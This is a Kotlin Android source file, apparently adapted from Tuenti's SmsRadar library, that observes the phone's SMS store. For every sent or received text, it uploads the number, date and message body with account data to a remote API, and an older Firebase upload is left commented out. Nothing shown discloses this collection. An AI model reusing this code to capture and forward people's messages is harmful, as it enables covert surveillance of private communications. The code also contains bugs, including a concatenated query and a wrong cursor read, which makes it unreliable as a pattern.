/*
 * Copyright (c) Tuenti Technologies S.L. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package an.xuan.tong.historycontact.smsradar


import an.xuan.tong.historycontact.Constant
import android.content.ContentResolver
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.provider.ContactsContract
import android.util.Log

import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import com.google.android.gms.tasks.OnFailureListener
import com.google.android.gms.tasks.OnSuccessListener
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.gson.Gson

import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.InformationResponse
import an.xuan.tong.historycontact.api.model.Message
import an.xuan.tong.historycontact.api.model.SmsSendServer
import an.xuan.tong.historycontact.realm.ApiCaching
import an.xuan.tong.historycontact.realm.HistoryContactConfiguration
import com.google.gson.reflect.TypeToken
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import io.realm.Realm
import retrofit2.http.GET


/**
 * ContentObserver created to handle the sms content provider changes. This entity will be called each time the
 * system changes the sms content provider state.
 *
 *
 * SmsObserver analyzes the change and studies if the protocol used is null or not to identify if the sms is incoming
 * or outgoing.
 *
 *
 * SmsObserver will analyze the sms inbox and sent content providers to get the sms information and will notify
 * SmsListener.
 *
 *
 * The content observer will be called each time the sms content provider be updated. This means that all
 * the sms state changes will be notified. For example, when the sms state change from SENDING to SENT state.
 *
 * @author Pedro Vcente Gómez Sánchez <pgomez></pgomez>@tuenti.com>
 * @author Manuel Peinado <mpeinado></mpeinado>@tuenti.com>
 */
internal class SmsObserver : ContentObserver {

    private lateinit var contentResolver: ContentResolver
    private lateinit var smsCursorParser: SmsCursorParser

    private var lastSMS: String? = null

    private val smsContentObserverCursor: Cursor?
        get() {
            try {
                val projection: Array<String>? = null
                val selection: String? = null
                val selectionArgs: Array<String>? = null
                val sortOrder: String? = null
                return contentResolver.query(SMS_URI, null, null, null, null)
            } catch (e: Exception) {
                return null
            } finally {
                Log.e("antx ", "getSmsContentObserverCursor null")
            }
        }

    constructor(handler: Handler) : super(handler) {}

    constructor(contentResolver: ContentResolver, handler: Handler, smsCursorParser: SmsCursorParser) : super(handler) {
        this.contentResolver = contentResolver
        this.smsCursorParser = smsCursorParser
    }

    override fun deliverSelfNotifications(): Boolean {
        return true
    }

    override fun onChange(selfChange: Boolean) {
        super.onChange(selfChange)
        var cursor: Cursor? = null
        try {
            cursor = smsContentObserverCursor
            if (cursor != null && cursor.moveToFirst()) {
                processSms(cursor)
            }


        } finally {
            if (cursor != null)
                cursor.close()
        }
    }

    private fun processSms(cursor: Cursor) {
        var smsCursor: Cursor? = null
        try {
            val protocol = cursor.getString(cursor.getColumnIndex(PROTOCOL_COLUM_NAME))
            Log.e("processSms", "sms$protocol")
            smsCursor = getSmsCursor(protocol)
            val sms = parseSms(smsCursor)
            if (sms != null) {
                Log.e("processSms", "sms" + sms.id)
                var phonesNumber = ""
                val phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + sms.id, null, null)
                while (phones.moveToNext()) {
                    phonesNumber = cursor.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    // mConno.add(position,phoneNumber);
                }
                phones.close()
                sms?.let { insertSms(1, sms.address, it.date, it.msg, it.type.toString()); }

                /*if (sms != null) {
                    val finalPhonesNumber = phonesNumber
                    AccountKit.getCurrentAccount(
                            object : AccountKitCallback<Account> {
                                override fun onSuccess(account: Account) {
                                    val smsSendServer = SmsSendServer(account.id.toString(), sms.type.toString(), sms.msg, sms.date, sms.id, sms.address, finalPhonesNumber)
                                    val mDatabase = FirebaseDatabase.getInstance().reference
                                    Log.e("mDatabase", "token: processSms")
                                    mDatabase.child("SMS").child(account.id.toString()).child(sms.phone).child(sms.id).setValue(smsSendServer)
                                            .addOnSuccessListener { Log.e("mDatabase", "token: onSuccess") }
                                            .addOnFailureListener { e -> Log.e("mDatabase", "token: onFailure " + e.message) }
                                }

                                override fun onError(accountKitError: AccountKitError) {

                                }
                            })
                }*/
            }


            notifySmsListener(sms)
        } finally {
            close(smsCursor)
        }
    }

    private fun notifySmsListener(sms: Sms?) {
        if (sms != null && SmsRadar.smsListener != null) {
            if (SmsType.SENT == sms.type) {
                Log.e("SmsType.SENT ", "sms" + sms.toString())
                SmsRadar.smsListener.onSmsSent(sms)
            } else {
                Log.e("msType.Received", "sms" + sms.toString())
                SmsRadar.smsListener.onSmsReceived(sms)
            }
        }
    }

    private fun getSmsCursor(protocol: String?): Cursor? {
        return getSmsDetailsCursor(protocol)
    }

    private fun getSmsDetailsCursor(protocol: String?): Cursor? {
        val smsCursor: Cursor?
        if (isProtocolForOutgoingSms(protocol)) {
            //SMS Sent
            smsCursor = getSmsDetailsCursor(SmsContext.SMS_SENT.uri)
        } else {
            //SMSReceived
            smsCursor = getSmsDetailsCursor(SmsContext.SMS_RECEIVED.uri)
        }
        return smsCursor
    }

    private fun isProtocolForOutgoingSms(protocol: String?): Boolean {
        return protocol == null
    }

    private fun getSmsDetailsCursor(smsUri: Uri?): Cursor? {

        return if (smsUri != null) this.contentResolver.query(smsUri, null, null, null, SMS_ORDER) else null
    }

    private fun parseSms(cursor: Cursor?): Sms? {
        return smsCursorParser.parse(cursor)
    }

    private fun close(cursor: Cursor?) {
        cursor?.close()
    }

    /**
     * Represents the SMS origin.
     */
    private enum class SmsContext {
        SMS_SENT {
            override val uri: Uri
                get() = SMS_SENT_URI
        },
        SMS_RECEIVED {
            override val uri: Uri
                get() = SMS_INBOX_URI
        };

        internal abstract val uri: Uri
    }

    fun smsChecker(sms: String): Boolean {
        var flagSMS = true

        if (sms == lastSMS) {
            flagSMS = false
        } else {
            lastSMS = sms
        }
        //if flagSMS = true, those 2 messages are different
        return flagSMS
    }

    companion object {

        private val SMS_URI = Uri.parse("content://sms/")
        private val SMS_SENT_URI = Uri.parse("content://sms/sent")
        private val SMS_INBOX_URI = Uri.parse("content://sms/inbox")
        private val PROTOCOL_COLUM_NAME = "protocol"
        private val SMS_ORDER = "date DESC"
    }

    private fun insertSms(acountId: Int, phoneNunber: String, datecreate: String, contentmessage: String, type: String) {
        var status = (type == "SENT")
        val token = convertJsonToObject(getCacheInformation()?.data).token
        var hmAuthToken = hashMapOf("Authorization" to "Bearer$token")
        var id = convertJsonToObject(getCacheInformation()?.data).data?.id
        val mAuthToken = HashMap(hmAuthToken)
        var account = Gson().toJson(convertJsonToObject(getCacheInformation()?.data).data)
        var message = Message(id, acountId, phoneNunber,
                datecreate, "location", contentmessage, status, account)
        Log.e("dataSend", " " + message.toString())
        acountId?.let {
            Repository.createService(ApiService::class.java, mAuthToken).insertMessage(message, Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            { result ->
                                Log.e("antx", "insertSms" + result.toString())

                            },
                            { e ->
                                Log.e("test", "insertSms error" + e.message)
                            })
        }
    }

    private fun convertJsonToObject(json: String?): InformationResponse {
        return Gson().fromJson(json, object : TypeToken<InformationResponse?>() {}.type)
    }

    private fun getCacheInformation(): ApiCaching? {
        val mRealm = Realm.getInstance(HistoryContactConfiguration.createBuilder().build())
        val mangaSearchObj: ApiCaching? = mRealm.where(ApiCaching::class.java).contains("apiName", mKeyAPI).findFirst()
        // clone data if don't have this line -> crash app after "mRealm.close()"
        val result = ApiCaching(mangaSearchObj?.apiName, mangaSearchObj?.data, mangaSearchObj?.updateAt)
        mRealm.close()
        return result
    }

    private val mKeyAPI: String by lazy {
        // Get Value of annotation API for save cache as KEY_CACHE
        val method = ApiService::getInfomation
        val get = method.annotations.find { it is GET } as? GET
        get?.value + ""
    }


}